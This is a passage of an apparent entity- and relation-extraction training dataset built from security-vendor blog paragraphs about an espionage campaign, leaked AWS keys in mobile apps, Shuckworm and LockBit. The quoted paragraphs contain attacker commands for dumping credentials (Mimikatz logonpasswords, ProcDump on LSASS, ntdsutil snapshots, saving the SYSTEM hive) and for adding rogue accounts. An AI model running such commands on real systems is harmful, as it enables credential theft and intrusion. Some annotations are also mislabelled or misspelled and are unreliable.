execute, Mimikatz), (attackers, dump credentials, Mimikatz)"}
{"instruction": "calc.exe \"\"privilege::debug\"\" \"\"sekurlsa::logonpasswords full\" \" exit \" On April 26, further malicious activity occurred when the attackers ran the Crash Handler executable and installed a file called cal.exe (SHA256: 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133) on the compromised machine. This file was LadonGo v3.8, a publicly available penetration testing framework that is written in Go. The attackers appear to have used LadonGo to scan the internal network for machines with RDP services running and attempted to exploit or log in to those machines using the credentials they stole several days earlier. There was also some evidence of brute-force login attempts against machines of interest.", "input": null, "output": "Named Entities: (calc.exe, file), (cal.exe, file), (12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133, SHA256), (LadonGo v3.8, tool), (Go, tool)\nRelationships: (attackers, installed, cal.exe), (cal.exe, hash, 12534f7014b3338d8f9f86ff1bbeacf8c80ad03f1d0d19077ff0e406c58b5133), (cal.exe, tool, LadonGo v3.8), (LadonGo v3.8, written in, Go), (attackers, used, LadonGo)"}
{"instruction": "On May 6, the attackers resumed their attack and ran the Crash Handler executable (this time named svchost.exe) and installed a new variant of Mimikatz named test.exe (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). This was likely done in order to obtain more credentials. The attackers then ran LadonGo and attempted to exploit a Netlogon vulnerability ( CVE-2020-1472 ) against two other computers in the organization in order to elevate privileges. On May 16, the attackers increased their level of activity and began moving laterally across the organization\u2019s network from the initially compromised computer (Computer #1). On a second computer (Computer #2), the attackers launched a command prompt and executed a variant of Mimikatz (file name: test.exe, SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). The attackers then deployed a number of Knowledge Base files (e.g. kb0394623.exe) on the computer. These files are legitimate copies of the Windows command prompt (with 16 bytes of the rich header modified).", "input": null, "output": "Named Entities: (Crash Handler, tool), (svchost.exe, file), (Mimikatz, malware), (test.exe, file), (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9, SHA256), (LadonGo, tool), (CVE-2020-1472, vulnerability), (kb0394623.exe, file)\n\nRelationships: (Crash Handler, named, svchost.exe), (svchost.exe, install, Mimikatz), (Mimikatz, name, test.exe), (test.exe, hash, 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9), (attackers, run, LadonGo), (LadonGo, exploit, CVE-2020-1472), (attackers, deploye, kb0394623.exe)"}
{"instruction": "On a third computer (Computer #3) the attackers used PsExec to execute the same older version of Crash Handler used on Computer #1, this time named javac.exe. A copy of this executable was then made to csidl_program_files\\windows mail\\winmailservice.exe and was executed. The attackers then ran dnscmd.exe (SHA256: 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc), which was used to enumerate DNS configuration information on the compromised computer: Dnscmd . /EnumZones Dnscmd is a Microsoft command-line tool for managing DNS servers. It can be used to script batch files to help automate routine DNS management tasks or to perform routine setup of new DNS servers. The enumzones command is used to list the zones that exist on the specified DNS server. If no filters are specified, a complete list of zones is returned.", "input": null, "output": "Named Entities: (PsExec, tool), (Crash Handler, file), (javac.exe, file), (csidl_program_files\\windows mail\\winmailservice.exe, file), (dnscmd.exe, tool), (67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc, SHA256)\nRelationships: (PsExec, execute, Crash Handler), (Crash Handler, name, javac.exe), (javac.exe, copy to, csidl_program_files\\windows mail\\winmailservice.exe), (attackers, run, dnscmd.exe), (dnscmd.exe, hash, 67877821bf1574060f4e45ab8be62e28f54fb40a23ce70b86a6369a4d63db5bc)"}
{"instruction": "Crash Handler was then used to install imjpuex.exe in the csidl_common_appdata\\veritas directory which in turn was used to side-load a DLL file of the same name and load a .dat file to execute an unknown custom payload. Shortly after this, the attackers attempted to list the records of multiple specific zones by specifying the domain on the command line: Dnscmd . /ZonePrint [REDACTED_DOMAIN] On a fourth computer (Computer #4), the attackers used PsExec to execute Crash Handler (this time named test.exe). They then installed and executed two KB files in the %TEMP% directory. \u2022 SHA256: 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda \u2022 SHA256: ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51 Again, both of these files were modified versions of the Windows command prompt. On May 17, the attackers deployed several more modified Windows command prompt applications on Computer #4. They also deployed the side-loading technique on Computer #5 to execute the legitimate svchost.exe application, possibly to facilitate some process injection.", "input": null, "output": "Named Entities: (Crash Handler, tool), (imjpuex.exe, file), (PsExec, tool), (test.exe, file), (5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda, SHA256), (ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51, SHA256), (svchost.exe, file)\nRelationships: (Crash Handler, install, imjpuex.exe), (Crash Handler,named, test.exe), (Crash Handler, execute, 5c4456f061ff764509a2b249f579a5a14d475c6714f714c5a45fdd67921b9fda), (Crash Handler, execute, ded734f79058c36a6050d801e1fb52cd5ca203f3fd6af6ddea52244132bd1b51), (attacker, execute, svchost.exe)"}
{"instruction": "On May 19, the attackers returned to Computer #5 and used svchost to launch NetworkService. The attackers then used a variant of Mimikatz named calc.exe, which was previously used earlier in the attack (SHA256: 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9). Mimikatz was used to dump credentials from the compromised host. On May 24, the attackers turned their attention to Computer #3, using PsExec to execute the whoami command and determine the currently logged-in user. They then ran an unknown batch file name t.bat via PsExec. It is likely the following commands were executed from this script in order to create a new user account: net user [REDACTED] CSIDL_SYSTEM\\net1 user [REDACTED] Asd123.aaaa /add net localgroup [REDACTED] [REDACTED]/add CSIDL_SYSTEM\\net1 localgroup [REDACTED] /add CSIDL_SYSTEM\\net1 user [REDACTED] Asd123.aaaa /add", "input": null, "output": "Named Entities: (svchost, tool), (NetworkService, tool), (Mimikatz, tool), (calc.exe, file), (912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9, SHA256), (PsExec, tool), (t.bat, file)\nRelationships: (svchost, launch, NetworkService), (attacker, use, Mimikatz), (Mimikatz, named, calc.exe), (calc.exe, hash, 912018ab3c6b16b39ee84f17745ff0c80a33cee241013ec35d0281e40c0658d9), (PsExec, execute, t.bat)"}
{"instruction": "The script uses net.exe to check if a specific user account already exists. It then attempts to create a user account with the password Asd123.aaaa and add it to the local group on the machine. Several minutes later, the task manager was launched followed by a command prompt. The attackers then ran the following command to mount a snapshot of the active directory server . ntdsutil snapshot \"mount c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb\" quit quit These snapshots contain sensitive information such as the active directory database (i.e. user credentials) and log files. The string c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb is the index number of the snapshot. The attackers then moved to Computer #5, where they used ProcDump (file name: p.exe, SHA256: 2f1520301536958bcf5c65516ca85a343133b443db9835a58049cd1694460424) to dump credentials from LSASS: p.exe -accepteula -ma lsass.exe lsass2.dmp", "input": null, "output": "Named Entities: (net.exe, file), (ProcDump, tool), (p.exe, file), (2f1520301536958bcf5c65516ca85a343133b443db9835a58049cd1694460424, SHA256), (lsass.exe, file), (lsass2.dmp, file)\n\nRelationships: (net.exe, check, user account), (attacker, use, ProcDump), (ProcDump, file name, p.exe), (p.exe, hash, 2f1520301536958bcf5c65516ca85a343133b443db9835a58049cd1694460424), (ProcDump, accepteula, lsass.exe), (ProcDump, ma, lsass.exe), (lsass.exe, dumped, lsass2.dmp)"}
{"instruction": "On May 26, the attackers returned to Computer #1 and executed a file called go64.exe. This file was a copy of Fscan. The attackers ran the following command to mass scan for any machines within the compromised network (specifically a class C scan against machines in the IP range 10.72.0.0 \u2192 10.72.0.255) with RDP services: go64.exe -h 10.72.0.101/24 -pa 3389 There is also evidence that the attackers leveraged Fscan in order to perform exploit attempts against other machines on the network, including leveraging one of the ProxyLogon vulnerabilities ( CVE-2021-26855 ) against an Exchange Server. Suspicious SMB activity also occurred around this time, suggesting the attackers may have also leveraged other exploits (likely EternalBlue) against any open SMB services. On June 6, the attackers ran PsExec on Computer #3 to launch the previously used old version of Crash Handler (file name: winnet.exe) from the %USERPROFILE%\\public\\ directory.", "input": null, "output": "Named Entities: (go64.exe, file), (Fscan, tool), (10.72.0.0, IP), (10.72.0.255, IP), (10.72.0.101, IP), (CVE-2021-26855, vulnerability), (PsExec, tool), (Crash Handler, tool), (winnet.exe, file)\n\nRelationships: (go64.exe, copy of, Fscan), (Fscan, scan, 10.72.0.0), (Fscan, scan, 10.72.0.255), (go64.exe, link to, 10.72.0.101), (Fscan, exploit, CVE-2021-26855), (PsExec, launch, Crash Handler), (Crash Handler, file name, winnet.exe)"}
{"instruction": "They ran the Dnscmd utility again to enumerate all available zones, before executing winnet.exe again and a copy of Crash Handler located at APPDATA%\\t.exe to load additional malicious payloads (likely used to install ProcExplorer): Dnscmd . /EnumZones \"CSIDL_COMMON_APPDATA\\t.exe\" Several hours later, ProcExplorer (64-bit) was launched: \"CSIDL_PROFILE\\desktop\\processexplorer\\procexp64.exe\" The last known malicious activity occurred on July 8 on Computer #3. The system hive file was dumped from the registry in order to dump user credentials. reg save HKLM\\SYSTEM system.hiv", "input": null, "output": "Named Entities: (Dnscmd utility, tool), (Crash Handler, tool), (ProcExplorer, tool), (CSIDL_PROFILE\\desktop\\processexplorer\\procexp64.exe, file),  (system.hiv, file)\nRelationships: (attacker, run, Dnscmd utility), (Dnscmd utility, execute, winnet.exe), (Dnscmd utility, load, Crash Handler), (Crash Handler, install, ProcExplorer), (ProcExplorer, launch, CSIDL_PROFILE\\desktop\\processexplorer\\procexp64.exe)"}
{"instruction": "Payloads While this group of attackers was previously using ShadowPad, it has since moved on and has been deploying a range of payloads. One of the payloads used was a previously unseen, feature-rich information stealer (Infostealer.Logdatter), which appeared to be custom built. Its capabilities included: Keylogging Taking screenshots Connecting to and querying SQL databases Code injection: Reading a file and injecting the contained code into a process Downloading files Stealing clipboard data Other payloads used by the attackers included: PlugX/Korplug Trojan Trochilus RAT QuasarRAT Ladon penetration testing framework Nirsoft Remote Desktop PassView: A publicly available tool that reveals the password stored by the Microsoft Remote Desktop Connection utility inside .rdp files A Simple Network Management Protocol (SNMP) scanning tool Fscan: A publicly available intranet scanning tool Nbtscan: A command-line tool that scans for open NETBIOS name servers FileZilla: A legitimate FTP client FastReverseProxy: A reverse proxy tool", "input": null, "output": "Named Entities: (ShadowPad, malware), (Infostealer.Logdatter, malware), (PlugX/Korplug Trojan, malware), (Trochilus RAT, malware), (QuasarRAT, malware), (Ladon penetration testing framework, tool), (Nirsoft Remote Desktop PassView, tool), (Simple Network Management Protocol (SNMP) scanning tool, tool), (Fscan, tool), (Nbtscan, tool), (FileZilla, tool), (FastReverseProxy, tool)\n\nRelationships: (ShadowPad, used by, attackers), (attackers, use, Infostealer.Logdatter), (attackers, use, PlugX/Korplug Trojan), (attackers, use, Trochilus RAT), (attackers, use, QuasarRAT), (attackers, use, Ladon penetration testing framework), (attackers, use, Nirsoft Remote Desktop PassView), (attackers, use, Simple Network Management Protocol (SNMP) scanning tool), (attackers, use, Fscan), (attackers, use, Nbtscan), (attackers, use, FileZilla), (attackers, use, FastReverseProxy)"}
{"instruction": "WebPass: A publicly available password collection tool TCPing: A publicly available tool that enables pings over TCP Various process dumpers Various keyloggers A number of PowerSploit scripts", "input": null, "output": "Named Entities: (WebPass, tool), (TCPing, tool)\nRelationships: No related entities and relations."}
{"instruction": "Links to earlier activity ShadowPad is a modular RAT that was designed as a successor to the Korplug/PlugX Trojan and was, for a period of time, sold on underground forums. However, despite its origins as a publicly available tool, it has since been closely linked to espionage actors. The tool was only sold publicly for a very short period of time and it is believed that it was only sold to a handful of buyers.", "input": null, "output": "Named Entities: (ShadowPad, malware), (Korplug/PlugX Trojan, malware), (espionage actors, attacker)\nRelationships: (ShadowPad, successor to, Korplug/PlugX Trojan), (ShadowPad, linked to, espionage actors)"}
{"instruction": "There is limited evidence to suggest links to past attacks involving the Korplug/PlugX malware and to attacks by a number of known groups, including Blackfly/Grayfly (APT41) and Mustang Panda. For example, the attackers leveraged a legitimate file called HPCustParticUI.exe, which was developed by HP for digital imaging applications. This previously occurred in attacks involving Korplug/Plug X . Furthermore, the attackers used a file called hpcustpartui.dll as a likely loader. The same loader was used in a long-running campaign involving Korplug/Plug X targeting the Roman Catholic Church . The current campaign uses a legitimate Bitdefender file to side-load shellcode. This same file and technique were observed in previous attacks linked to APT41 . We have also observed the same keylogging tool deployed in previous attacks against critical infrastructure in South East Asia.", "input": null, "output": "Named Entities: (Korplug/PlugX, malware), (Blackfly/Grayfly, attacker), (APT41, attacker), (Mustang Panda, attacker), (HPCustParticUI.exe, file), (hpcustpartui.dll, file), (keylogging tool, tool)\nRelationships: (Korplug/PlugX, link to, Blackfly/Grayfly), (Blackfly/Grayfly, aka, APT41), (Korplug/PlugX, link to, Mustang Panda), (Korplug/PlugX, use, HPCustParticUI.exe), (Korplug/PlugX, use, hpcustpartui.dll)"}
{"instruction": "The use of legitimate applications to facilitate DLL side-loading appears to be a growing trend among espionage actors operating in the region. Although a well-known technique, it must be yielding some success for attackers given its current popularity. Organizations are encouraged to thoroughly audit software running on their networks and monitor for the presence of outliers, such as old, outdated software or packages that are not officially used by the organization.", "input": null, "output": "No related entities and relations."}
{"instruction": "Mobile App Supply Chain Vulnerabilities Could Endanger Sensitive Business Information", "input": null, "output": "No related entities and relations."}
{"instruction": "Over three-quarters of the apps Symantec analyzed contained valid AWS access tokens that allowed access to private AWS cloud services. Most of us, by now, have been impacted in some way by supply chain issues. An increase in the price of fuel and other items, delivery delays, and a lack of product availability are just some of the consequences of supply chain issues stemming from recent events around the world. However, in the context of software and technology infrastructure, the consequences resulting from supply chain issues are very different. Mobile apps, for example, can contain vulnerabilities introduced in the supply chain that can potentially lead to the exposure of sensitive information, which in turn could be used by threat actors for other attacks.", "input": null, "output": "No related entities and relations."}
{"instruction": "Mobile app supply chain vulnerabilities are often added by app developers, both knowingly and unknowingly, who are likely unaware of the downstream security impacts putting not only the app users\u2019 privacy at risk, but sometimes putting their company and employer\u2019s privacy and data at risk too.", "input": null, "output": "No related entities and relations."}
{"instruction": "The mobile app supply chain problem Similar to the supply chain for material goods, mobile application software development undergoes a process that includes: the collection of materials, such as software libraries and software development kit (SDKs); manufacturing or developing the mobile application; and shipping the end result to the customer, often using mobile app stores. This blog examines the type of upstream supply chain issues that can make their way into mobile apps, making them vulnerable. These issues include: Mobile app developers unknowingly using vulnerable external software libraries and SDKs Companies outsourcing the development of their mobile apps, which then end up with vulnerabilities that put them at risk Companies, often larger ones developing multiple apps across teams, using cross-team vulnerable libraries in their apps", "input": null, "output": "No related entities and relations."}
{"instruction": "In order to better understand the prevalence and scope of these supply chain vulnerabilities, we took a look at publicly available apps in our global app collection that contained hard-coded Amazon Web Services (AWS) credentials. Hard-coded cloud credentials is a type of vulnerability we've been looking at for years and have extensively covered in the past. This time, in order to get to the bottom of the supply chain impacts caused by this issue, we've looked into why app developers hard-code cloud credentials inside apps; where the hard-coded credentials are located in the apps - tracking the sequence, or chain of events leading to the vulnerability; and finally, the size of the problem and its impact.", "input": null, "output": "No related entities and relations."}
{"instruction": "Scope of the problem We identified 1,859 publicly available apps, both Android and iOS, containing hard-coded AWS credentials. Almost all were iOS apps (98%) - a trend and difference between the platforms we've been tracking for years, possibly linked to different app store vetting practices and policies. In any case, we examined the scope and extent of the risks involved when AWS credentials were found embedded inside apps. We found the following: Over three-quarters (77%) of the apps contained valid AWS access tokens allowing access to private AWS cloud services Close to half (47%) of those apps contained valid AWS tokens that also gave full access to numerous, often millions, of private files via the Amazon Simple Storage Service (Amazon S3)", "input": null, "output": "No related entities and relations."}
{"instruction": "We will explore the type of private data exposed in the examples discussed later in this blog, but the message is clear: apps with hard-coded AWS access tokens are vulnerable, active, and present a serious risk.", "input": null, "output": "No related entities and relations."}
{"instruction": "Source of the problem We then looked into why and where exactly the AWS access tokens were inside the apps, and if they are found in other apps. We discovered that over half (53%) of the apps were using the same AWS access tokens found in other apps. Interestingly, these apps were often from different app developers and companies. This pointed at a supply chain vulnerability, and that's exactly what we found. The AWS access tokens could be traced to a shared library, third-party SDK, or other shared component used in developing the apps. As for the remaining question of why app developers are using hard-coded access keys, we found the reasons to include: Downloading or uploading assets and resources required for the app, usually large media files, recordings, or images", "input": null, "output": "No related entities and relations."}
{"instruction": "Accessing configuration files for the app and/or registering the device and collecting device information and storing it in the cloud Accessing cloud services that require authentication, such as translation services, for example No specific reason, dead code, and/or used for testing and never removed", "input": null, "output": "No related entities and relations."}
{"instruction": "If an access key only has permission to access a specific cloud service or asset, for example accessing public image files from the corporate Amazon S3 service, the impact may be minimal. Some app developers may be assuming this is the case when they embed and use hard-coded AWS access tokens to access a single bucket or file in Amazon S3. The problem is often the same AWS access token exposes all files and buckets in the Amazon S3 cloud, often corporate files, infrastructure files and components, database backups, etc. Not to mention cloud services beyond Amazon S3 that are accessible using the same AWS access token.", "input": null, "output": "No related entities and relations."}
{"instruction": "Imagine a business-to-business (B2B) company providing access to its service using a third-party SDK and embedding an AWS hard-coded access key, exposing not only the private data of the app using the third-party SDK, but also the private data of all apps using the third-party component. Unfortunately, this is not an uncommon occurrence, as you can see in the following case study examples.", "input": null, "output": "No related entities and relations."}
{"instruction": "Case studies Intranet platform SDK We found a B2B company providing an intranet and communication platform had also provided a mobile SDK that its customers could use to access the platform. Unfortunately, the SDK also contained the B2B company\u2019s cloud infrastructure keys, exposing all of its customers' private data on the B2B company\u2019s platform. Their customers' corporate data, financial records, and employees' private data was exposed. All the files the company used on its intranet for over 15,000 medium-to-large-sized companies were also exposed. Why did the company hard-code the AWS access token? In order to access the AWS translation service. Instead of limiting the hard-coded access token for use with the translation cloud service, anyone with the token had full unfettered access to all the B2B company\u2019s AWS cloud services. Digital identity and authentication", "input": null, "output": "No related entities and relations."}
{"instruction": "We discovered several popular banking apps on iOS that rely on the same vulnerable third-party AI Digital Identity SDK. Outsourcing the digital identity and authentication component of an app is a common development pattern as the complexities of providing different forms of authentication, maintaining the secure infrastructure, and accessing and managing the identities can incur a high cost and requires expertise in order to do it right. Unfortunately, in this case, things were not done right. Embedded in the SDK were cloud credentials that could place entire infrastructures at risk. The credentials could expose private authentication data and keys belonging to every banking and financial app using the SDK. Furthermore, users' biometric digital fingerprints used for authentication, along with users\u2019 personal data (names, dates of birth, etc.), were exposed in the cloud.", "input": null, "output": "No related entities and relations."}
{"instruction": "In addition, the access key exposed the infrastructure server and blueprints, including the API source code and AI models, used for the whole operation. In total, over 300,000 biometric digital fingerprints were leaked across five mobile banking apps using the SDK. Online gaming technology platform Often already established companies rely on outsourcing, or partnering, with other B2B companies for their digital and online services. This allows them to quickly move their brand online without having to build and support the underlying technology platform. At the same time, by relying on the outsourced company to run the technology platform, they often have to give exclusive access to their business data. Furthermore, they have to trust that the outsourced company will protect the online private data, not to mention the reputation of the brand overall.", "input": null, "output": "No related entities and relations."}
{"instruction": "We found a large hospitality and entertainment company depending on another company for their technology platform, even forming a sports betting joint venture with the company. With a highly regulated sports betting market the complexities of building and supporting infrastructure for online gambling cannot be understated. Unfortunately, by giving the joint venture company exclusive access to that part of its business, the company also exposed its gaming operations, business data, and customer data to the world. In total, 16 different online gambling apps using the vulnerable library exposed full infrastructure and cloud services across all AWS cloud services with full read/write root account credentials. All of the organizations whose vulnerable apps were discussed in these case studies have been notified about the issues we uncovered.", "input": null, "output": "No related entities and relations."}
{"instruction": "Avoiding supply chain issues \nProtecting yourself from these types of supply chain issues is possible. Adding security scanning solutions to the app development lifecycle and, if using an outsourced provider, requiring and reviewing Mobile App Report Cards, which can identify any unwanted app behaviors or vulnerabilities for every release of a mobile app, can all be helpful in highlighting potential issues. As an app developer, look for a report card that both scans SDKs and frameworks in your application and identifies the source of any vulnerabilities or unwanted behaviors. \nSymantec Enterprise Blogs You might also enjoy \n8 Min Read", "input": null, "output": "No related entities and relations."}
{"instruction": "Symantec Mobile Threat Defense: Mistakes App Developers Should Avoid \u2013 Blind Trust Developers shouldn\u2019t assume that their DevOps, IT, or cloud service provider adequately protects their app users\u2019 private and sensitive data", "input": null, "output": "No related entities and relations."}
{"instruction": "Shuckworm: Russia-Linked Group Maintains Ukraine Focus", "input": null, "output": "Named Entities: (Shuckworm, attacker)\nRelationships:No related entities and relations."}
{"instruction": "Infostealer appears to be payload in recent activity aimed at Ukrainian organizations. UPDATE, 17.40 BST, August 15, 2022 : Update for clarity re use of VCD, ASC, and H264 file extensions in file names. UPDATE, 17.50 BST, August 17, 2022: Additional IOCs added Recent Shuckworm activity observed by Symantec, a division of Broadcom Software , and aimed at Ukraine appears to be delivering information-stealing malware to targeted networks. This activity was ongoing as recently as August 8, 2022 and much of the activity observed in this campaign is consistent with activity that was highlighted by CERT-UA on July 26. The activity observed by Symantec began on July 15, and we have additional indicators of compromise (IOCs) and technical details to share about this campaign.", "input": null, "output": "Named Entities: (Infostealer, malware), (Shuckworm, attacker)\nRelationships: (Shuckworm, deliver, Infostealer)"}
{"instruction": "Shuckworm (aka Gamaredon, Armageddon) is a Russia-linked group that has almost exclusively focused its operations on Ukraine since it first appeared in 2014. It is generally considered to be a state-sponsored espionage operation.", "input": null, "output": "Named Entities: (Shuckworm, attacker), (Gamaredon, attacker), (Armageddon, attacker)\nRelationships: (Shuckworm, aka, Gamaredon), (Shuckworm, aka, Armageddon)"}
{"instruction": "Infection Vector \nThe first suspicious activity Symantec saw on victim systems was a self-extracting 7-Zip file, which was downloaded via the system\u2019s default browser. Subsequently, mshta.exe downloaded an XML file, which was likely masquerading as an HTML application (HTA) file. \nThese files were downloaded from the following domain: a0698649[.]xsph[.]ru. It has been publicly documented since May 2022 that subdomains of xsph[.]ru are associated with Shuckworm activity, and this domain was once again mentioned in CERT-UA\u2019s July 26 publication about Shuckworm activity. \nThis domain was also associated with an email that spoofed being from the Security Service of Ukraine and had \u201cIntelligence Bulletin\u201d in the subject line, according to CERT-UA. This being the case, it is most likely the 7-Zip file seen on victim networks in the campaign observed by Symantec was delivered to victims via email.", "input": null, "output": "Named Entities: (mshta.exe, file), (a0698649[.]xsph[.]ru, Domain), (xsph[.]ru, Domain), (Shuckworm,attacker)\nRelationships: (mshta.exe, downloaded from, a0698649[.]xsph[.]ru), (a0698649[.]xsph[.]ru, associated with, Shuckworm), (xsph[.]ru, associated with, Shuckworm)"}
{"instruction": "Attack Chain The downloading of the XML file onto victim networks was followed by the execution of a PowerShell stealer. We saw three versions of the same PowerShell stealer appear on the one system. It\u2019s possible the attackers may have deployed multiple versions of the stealer, which were all very similar, as an attempt to evade detection. Two VBS downloaders that had the words \u201cjuice\u201d and \u201cjustice\u201d in their file names were also observed on victim machines. Analysis found that these were Backdoor.Pterodo, a well-known Shuckworm tool that Symantec blogged about earlier this year . These scripts are capable of calling PowerShell, uploading screenshots, and also executing code downloaded from a command-and-control (C&C) server.", "input": null, "output": "Named Entities: (Backdoor.Pterodo, malware), (Shuckworm, attacker)\nRelationships: (Backdoor.Pterodo, tool of, Shuckworm)"}
{"instruction": "Various suspicious files containing \u201cntuser\u201d in the file names were also seen on victim machines. We associate these \u201cntuser\u201d files with Shuckworm activity, and many variants of them are malicious, with most detected as the Giddome backdoor, another well-known Shuckworm tool. We saw various parent processes with file names that had VCD, H264 and ASC extensions. A file named ntuser.dat.tmcontainer.vcd was the parent process for a Giddome backdoor variant named ntuser.dat.tm.descendant.exe that was seen on victim machines. A suspicious file named ntuser.dat.tmcontainer.h264 had a child process named ntuser.dat.tm.declare.exe , another malicious Giddome backdoor binary. Elsewhere, a file named ntuser.dat.tmcontainer.asc had a child process named ntuser.dat.tm.decay.exe .", "input": null, "output": "Named Entities: (ntuser, tool), (Shuckworm, attacker), (Giddome backdoor, malware), (ntuser.dat.tmcontainer.vcd, file), (ntuser.dat.tm.descendant.exe, file), (ntuser.dat.tmcontainer.h264, file), (ntuser.dat.tm.declare.exe, file), (ntuser.dat.tmcontainer.asc, file), (ntuser.dat.tm.decay.exe, file)\nRelationships: (ntuser, associated with, Shuckworm), (ntuser, associated with, Giddome backdoor), (ntuser.dat.tmcontainer.vcd, parent process, tuser.dat.tm.descendant.exe), (Giddome backdoor, named, tuser.dat.tm.descendant.exe), (ntuser.dat.tmcontainer.h264, child process, ntuser.dat.tm.declare.exe), (Giddome backdoor, binary, ntuser.dat.tm.declare.exe), (ntuser.dat.tmcontainer.asc, child process, ntuser.dat.tm.decay.exe)"}
{"instruction": "VCD files are disc images of a CD or DVD and are recognized by Windows as an actual disc, similar to ISO files, which we commonly see malicious actors use to deliver payloads. An ASC file is an encrypted file that may contain text or binary information encoded as text, while an H264 file is a video file. However, filenames with the ntuser.dat.tmcontainer prefix are files that represent the registry. It\u2019s not clear if these are the actual file types, or if the attackers are using these file names as a means of sowing confusion. The backdoor dropped on victim systems had the file name 4896.exe . This backdoor had multiple capabilities, including: Record audio using the microphone and upload the recorded files to a remote location Take screenshots and upload them Log and upload keystrokes Download and execute .exe files or download and load DLL files", "input": null, "output": "Named Entities: (4896.exe, file), (backdoor, threat type)\n\nRelationships: (4896.exe, belong to, backdoor)"}
{"instruction": "The legitimate remote desktop protocol (RDP) tools Ammyy Admin and AnyDesk were both also leveraged by the attackers for remote access. Legitimate RDP tools like these and others are frequently leveraged for remote access by attackers in both ransomware and nation-state-backed cyber attacks.", "input": null, "output": "Named Entities: (Ammyy Admin, tool), (AnyDesk, tool)\nRelationships: (Ammyy Admin, leveraged by, attackers), (AnyDesk, leveraged by, attackers)"}
{"instruction": "Shuckworm Keeps Focus on Ukraine \nThis campaign, combined with previous public reporting on Shuckworm, shows some patterns in the operations of the group at the moment, including its reuse of patterns, e.g. paths (such as csidl_profile\\music), using files that contain \"ntuser.dat\" in the file name, using various artifacts that contain, for\u00a0example, \"judgement\" in the file name, and also leveraging EXE files whose file names contain English words that begin with \"D\", \u201cdat\u201d, \u201cdecay\u201d, \u201cdeer\u201d, \u201cdeclare\u201d, etc. \nAs the Russian invasion of Ukraine approaches the six-month mark, Shuckworm\u2019s long-time focus on the country appears to be continuing unabated. That this recent activity continues even after CERT-UA documented it shows that fear of exposure does not deter the group from its activities. While Shuckworm is not necessarily the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations.", "input": null, "output": "Named Entities: (Shuckworm, attacker), (ntuser.dat, file)\nRelationships: (Shuckworm, use, ntuser.dat)"}
{"instruction": "LockBit: Ransomware Puts Servers in the Crosshairs", "input": null, "output": "Named Entities: (LockBit, malware), (Ransomware, threat type)\nRelationships: (LockBit, belong to, Ransomware)"}
{"instruction": "LockBit affiliates using servers to spread ransomware throughout networks. \nSymantec, a division of Broadcom Software , has observed threat actors targeting server machines in order to spread the LockBit ransomware threat throughout compromised networks. \nIn one attack observed by Symantec, LockBit was seen identifying domain-related information, creating a Group Policy for lateral movement, and executing a \"gpupdate /force\" command on all systems within the same domain, which forcefully updates group policy.", "input": null, "output": "Named Entities: (LockBit, malware)\nRelationships: No related entities and relations.\n"}
{"instruction": "LockBit \nLockBit is a ransomware-as-a-service (RaaS) operated by malicious actors Symantec tracks as Syrphid. \nShortly after it first appeared in September 2019, the Syrphid gang expanded its operations, using a network of affiliates to deploy the LockBit ransomware on victim networks. The ransomware, which has currently reached version 3.0 , has evolved over the past few years, as has its operators who have recently launched a bug bounty program in order to weed out weaknesses in the malware\u2019s code and the RaaS operation as a whole.", "input": null, "output": "Named Entities: (LockBit, ransomware), (Syrphid, attacker)\nRelationships: (LockBit, operated by, Syrphid)"}
{"instruction": "Attack chain In one observed instance, before dropping and executing the LockBit ransomware, an attacker had RDP access to the enterprise network for a couple of weeks at least. This access may have been obtained through remote desktop applications such as AnyDesk or Windows RDP, or by exploiting a known vulnerability, etc. LockBit behaves differently on server machines with domain controllers than on Windows 10 machines. When executed on a server, it has the capability to spread through the network using Group Policy. On Windows 10 machines it performs routine ransomware activity and encrypts files. When LockBit is executed on a server machine it carries out the following actions: 1. Debugger check LockBit first checks if the malware process is being debugged. If this is the case, it goes into an infinite loop. Figure 1. If malware process is being debugged, LockBit goes into an infinite loop 2. Language Check", "input": null, "output": "Named Entities: (LockBit, malware), (AnyDesk, tool), (Windows RDP, tool), \nRelationships: (LockBit, use, AnyDesk), (LockBit, use, Windows RDP)"}
{"instruction": "It calls GetSystemDefaultUILanguage and GetUserDefaultUILanguage to check the language. If the language matches with the one on the malware\u2019s list then it terminates immediately. LockBit does not target Russia or a selection of nearby countries. Figure 2. LockBit calls GetSystemDefaultUILanguage and GetUserDefaultUILanguage to check the language. 3. End running processes and disable services LockBit ends a list of running processes related to malware analysis and other processes like Process Explorer, Process Monitor, Wireshark, Dumpcap, Process Hacker, cmd.exe, TeamViewer, Notepad, Notepad++, WordPad etc. Disables a list of services related to SQL, backup, and MSExchange etc. 4. Privilege escalation Duplicates the token by calling DuplicateTokenEx and creates a new process using CreateProcessAsUserW. After it achieves privilege escalation, LockBit relaunches itself under DLLHost.exe. Once the new process is spawned, the LockBit process ends itself. 5. Bypass UAC", "input": null, "output": "Named Entities: (LockBit, malware), (Process Explorer, tool), (Process Monitor, tool), (Wireshark, tool), (Dumpcap, tool), (Process Hacker, tool), (cmd.exe, file), (TeamViewer, tool), (Notepad, tool), (Notepad++, tool), (WordPad, tool), (DLLHost.exe, file)\nRelationships: (LockBit, end, Process Explorer), (LockBit, end, Process Monitor), (LockBit, end, Wireshark), (LockBit, end, Dumpcap), (LockBit, end, Process Hacker), (LockBit, end, cmd.exe), (LockBit, end, TeamViewer), (LockBit, end, Notepad), (LockBit, end, Notepad++), (LockBit, end, WordPad), (LockBit, relaunch, 